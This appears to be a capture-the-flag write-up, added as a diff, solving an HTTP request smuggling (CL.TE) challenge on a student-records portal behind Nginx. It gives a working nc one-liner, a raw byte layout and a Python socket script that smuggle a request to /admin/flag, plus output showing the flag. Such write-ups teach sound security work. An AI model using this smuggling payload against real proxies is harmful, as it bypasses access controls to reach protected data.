@@ -1,0 +1,108 @@
+Challenge:
+The university proudly launched its shiny new Student Records Portal, complete with an Nginx proxy standing guard in front of the backend.
+
+Hidden behind the proxy lies an admin-only flag endpoint, never meant to be seen by outsiders.
+
+Can you find a way to bypass the proxy’s defenses and reach the hidden resource?
+
+http://0.cloud.chals.io:11578/
+robots.txt (Cost: 0 points)
+User-agent: * Disallow: /admin/flag
+
+Hint 1 (Cost: 0 points)
+Proxies don’t always agree with backends on how to read a request. Try looking for discrepancies.
+
+Hint 2 (Cost: 0 points)
+What happens if you send a request with both Content-Length and Transfer-Encoding header fields together?
+
+Hint 3 (Cost: 0 points)
+When using Transfer-Encoding: chunked, end the body with 0\r\n\r\n. If the connection is kept alive, you can sneak a second request (like GET) immediately after.
+
+Solution:
+You’re looking at an HTTP request smuggling challenge (CL.TE mismatch).
+Nginx (front-end) and the backend disagree about how to interpret a request when both Content-Length and Transfer-Encoding: chunked are present. We’ll exploit that to “smuggle” a second request for /admin/flag through the same TCP connection.
+
+TL;DR exploit plan (CL.TE)
+	•	Front-end honors Content-Length (CL) → reads exactly N bytes as the body.
+	•	Back-end honors Transfer-Encoding: chunked (TE) → parses the body as chunks until it sees the terminating chunk 0\r\n\r\n.
+	•	So we send a first request with:
+	•	Transfer-Encoding: chunked
+	•	Content-Length: 5
+	•	Body = just the terminating chunk: 0\r\n\r\n
+	•	Immediately after that body, on the same connection, we place a second HTTP request:
+	•	GET /admin/flag HTTP/1.1\r\nHost: 0.cloud.chals.io:11578\r\n\r\n
+
+Why it works:
+The frontend (CL) thinks the body is 5 bytes and stops. The backend (TE) sees a chunked body that immediately ends (because it begins with 0\r\n\r\n), then treats the next bytes on the socket as a brand-new request — our smuggled GET /admin/flag.
+
+One-liner with nc
+
+Run this exactly (note the \r\n line endings everywhere and the Content-Length: 5):
+```plaintext
+printf 'POST / HTTP/1.1\r\nHost: 0.cloud.chals.io:11578\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nGET /admin/flag HTTP/1.1\r\nHost: 0.cloud.chals.io:11578\r\n\r\n' | nc 0.cloud.chals.io 11578
+```
+
+Raw bytes outline (for clarity)
+```plaintext
+POST / HTTP/1.1\r\n
+Host: 0.cloud.chals.io:11578\r\n
+Content-Length: 5\r\n
+Transfer-Encoding: chunked\r\n
+Connection: keep-alive\r\n
+\r\n
+0\r\n
+\r\n
+GET /admin/flag HTTP/1.1\r\n
+Host: 0.cloud.chals.io:11578\r\n
+\r\n
+```
+
+Key parts:
+	•	Content-Length: 5 exactly equals the length of 0\r\n\r\n (5 bytes).
+	•	0\r\n\r\n is the terminating chunk for TE.
+	•	The second GET starts immediately after, no extra bytes.
+
+Minimal Python (raw sockets)
+
+If you prefer a script:
+```Python
+import socket
+
+host = "0.cloud.chals.io"
+port = 11578
+
+payload = (
+    "POST / HTTP/1.1\r\n"
+    f"Host: {host}:{port}\r\n"
+    "Content-Length: 5\r\n"
+    "Transfer-Encoding: chunked\r\n"
+    "Connection: keep-alive\r\n"
+    "\r\n"
+    "0\r\n"
+    "\r\n"
+    "GET /admin/flag HTTP/1.1\r\n"
+    f"Host: {host}:{port}\r\n"
+    "\r\n"
+).encode()
+
+s = socket.create_connection((host, port))
+s.sendall(payload)
+resp = s.recv(65535)
+print(resp.decode(errors="replace"))
+s.close()
+```
+You should see two HTTP responses concatenated; the second one is the flag page.
+
+Output:
+seed@seedvm2004:/mnt/hgfs/CNS-S5/CTF-26th-Aug/DNS Mystery$ printf 'POST / HTTP/1.1\r\nHost: 0.cloud.chals.io:11578\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nGET /admin/flag HTTP/1.1\r\nHost: 0.cloud.chals.io:11578\r\n\r\n' | nc 0.cloud.chals.io 11578
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 34
+Date: Tue, 26 Aug 2025 05:58:16 GMT
+
+Welcome to Student Records Portal!HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 31
+Date: Tue, 26 Aug 2025 05:58:16 GMT
+
+isfcr{5muggl3d_r3qu3s7_5ucc355}
